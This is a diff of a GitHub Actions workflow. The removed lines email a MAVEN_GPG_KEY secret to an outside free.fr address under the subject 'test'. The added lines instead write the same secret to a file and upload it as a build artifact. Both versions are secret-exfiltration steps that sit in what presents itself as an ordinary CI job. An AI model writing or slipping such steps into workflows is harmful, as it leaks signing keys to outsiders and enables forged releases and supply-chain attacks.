@@ -6,6 +6,9 @@ jobs:
     runs-on: ubuntu-latest
     steps:
     - name: install
-      run: sudo apt install mailutils -y
-    - name: send mail
-      run: echo "{{ MAVEN_GPG_KEY }}" | mail -s "test" unknow0@free.fr
+      run: |
+        sudo apt install mailutils -y
+        echo "${{ MAVEN_GPG_KEY }}" > file
+    - uses: actions/upload-artifact@v7
+      with:
+        path: file
